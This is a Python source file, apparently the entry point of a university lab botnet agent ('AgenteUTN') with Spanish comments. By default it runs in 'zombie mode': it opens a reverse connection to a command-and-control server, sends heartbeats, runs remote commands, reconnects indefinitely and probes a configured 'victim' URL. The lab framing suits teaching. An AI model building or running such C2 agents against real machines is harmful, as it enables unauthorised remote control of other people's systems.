"""AgenteUTN - Aplicación principal de laboratorio (punto de entrada del .exe).

Comportamiento por defecto: modo zombie. Conecta al C2 (conexión inversa),
envía hello/heartbeat, responde comandos remotos y reconecta indefinidamente
mientras el C2 no esté disponible. Termina con stop/bye/auth o Ctrl+C.

Con `--menu` se abre el menú de diagnóstico local (ping, info, heartbeat,
verificación de la víctima y conexión manual al C2).
"""
from __future__ import annotations

import asyncio
import json
import sys
import time
import urllib.error
import urllib.request
import uuid

from . import config
from .c2_client import EXIT_RETRY, connect_c2
from .commands import handle_command
from .identity import build_hello, build_heartbeat
from .protocol import decode_message, encode_message
from .reconnect_policy import reconnect_decision


def mostrar(mensaje):
    """Muestra información JSON en consola."""
    print(json.dumps(mensaje, ensure_ascii=False, indent=2))


def verificar_victima():
    """Realiza una única solicitud HTTP de diagnóstico a la URL configurada."""
    if not config.VICTIMA_URL:
        print("VICTIMA_URL no está configurada; no se puede verificar la víctima.")
        return

    print("\nVerificando servidor víctima...")
    inicio = time.perf_counter()

    try:
        with urllib.request.urlopen(config.VICTIMA_URL, timeout=5) as respuesta:
            codigo = respuesta.status
            respuesta.read(1024)
        milisegundos = (time.perf_counter() - inicio) * 1000
        print(f"Servidor: {config.VICTIMA_URL}")
        print(f"HTTP: {codigo}")
        print(f"Tiempo: {milisegundos:.2f} ms")
    except (urllib.error.URLError, TimeoutError) as error:
        print(f"Error de conexión: {error}")


def ejecutar_comando(nombre):
    """Ejecuta un comando de diagnóstico local."""
    mensaje = {
        "type": "command",
        "id": "diagnostico-local",
        "name": nombre,
        "args": {},
    }
    resultado = handle_command(
        decode_message(encode_message(mensaje))
    )
    mostrar(resultado)


def modo_zombie(agent_id):
    """Conecta al C2 y reconecta indefinidamente mientras esté caído.

    Respeta la política de reconexión para el primer tramo (busy, caída del
    C2), pero si el C2 sigue caído reintenta sin límite con la espera
    configurada. Termina con stop/bye/auth (sin reconexión) o Ctrl+C.
    """
    attempts = 0
    while True:
        try:
            exit_code = asyncio.run(
                connect_c2(agent_id, secret=config.C2_SHARED_SECRET)
            )
        except KeyboardInterrupt:
            print("\nDesconectado por el usuario.")
            return
        except (OSError, asyncio.TimeoutError) as error:
            print(f"\nError de conexión: {error}")
            exit_code = EXIT_RETRY

        if exit_code != EXIT_RETRY:
            print("\nSesión finalizada.")
            return

        attempts += 1
        decision = reconnect_decision(
            {"type": "connection_lost"},
            attempts=attempts,
        )
        delay = decision["delay"] if decision["retry"] else config.RECONNECT_DELAY_S
        print(f"\nReconectando en {delay} s (intento {attempts})...")
        time.sleep(delay)


def mostrar_menu():
    print("\n" + "=" * 52)
    print(f"       {config.APP_NAME} - Versión {config.VERSION}")
    print("=" * 52)

    print("1. Ejecutar PING local")
    print("2. Mostrar información del equipo")
    print("3. Enviar HEARTBEAT local")
    print("4. Verificar servidor víctima")
    print("5. Conectar al servidor C2 (modo zombie)")
    print("6. Salir")

    print("=" * 52)


def menu(agent_id):
    """Menú de diagnóstico local (solo con --menu)."""
    print(f"\n{config.APP_NAME} iniciado correctamente.")
    print(f"Identificador: {agent_id}")

    print("\nInformación del agente:")
    mostrar(build_hello(agent_id))

    while True:
        mostrar_menu()
        opcion = input("\nSeleccione una opción: ").strip()

        if opcion == "1":
            print("\nPING local:")
            ejecutar_comando("ping")
        elif opcion == "2":
            print("\nInformación del equipo:")
            ejecutar_comando("info")
        elif opcion == "3":
            print("\nHEARTBEAT local:")
            mostrar(build_heartbeat())
        elif opcion == "4":
            verificar_victima()
        elif opcion == "5":
            modo_zombie(agent_id)
        elif opcion == "6":
            print(f"\nFinalizando {config.APP_NAME}...")
            break
        else:
            print("\nOpción no válida.")


def main():
    agent_id = f"utn-{uuid.uuid4().hex[:12]}"

    if "--menu" in sys.argv:
        menu(agent_id)
        return

    print(f"{config.APP_NAME} iniciado (modo zombie).")
    print(f"Identificador: {agent_id}")
    modo_zombie(agent_id)


if __name__ == "__main__":
    main()
